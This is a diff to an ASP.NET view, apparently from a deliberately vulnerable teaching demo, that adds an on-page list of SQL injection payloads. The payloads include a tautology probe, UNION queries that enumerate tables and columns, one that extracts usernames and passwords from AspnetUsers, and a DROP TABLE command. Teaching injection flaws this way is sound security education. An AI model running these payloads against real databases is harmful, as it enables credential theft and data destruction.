@@ -1,6 +1,23 @@
 ﻿@model IEnumerable<A1___Demo.Models.Registration>
 <h4>User Accounts</h4>
 <hr />
+<p>
+    To exploit the SQL Injection threat, you can try:
+    <ul>
+        <li>Use <span class="badge badge-danger">abc' OR 1=1 --</span> - In this case this is the easiest way to determine that SQL is unsecure</li>
+        <li>Going further, you can discover all tables in SQL by using this query <span class="badge badge-danger">abc' UNION SELECT [name], cast(max_column_id_used as varchar(5)) FROM sys.Tables --</span> - Now all tables and how many colums each one has will be shown</li>
+        <li>
+            In a hyphotetical attack, sensitive data could be stolen. Try this: <span class="badge badge-danger">abc' UNION SELECT Username, Password FROM AspnetUsers --</span>
+        </li>
+        <li>
+            Now you can try another commands, like:
+            <ul>
+                <li><span class="badge badge-danger">abc' UNION SELECT COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Course' --</span></li>
+                <li>Bob drop table :) - <span class="badge badge-danger">abc' DROP TABLE Student --</span> - After this, click on the button Recreat at the bottom of this page</li>
+            </ul>
+        </li>
+    </ul>
+</p>
 <table class="table">
     <thead>
         <tr>
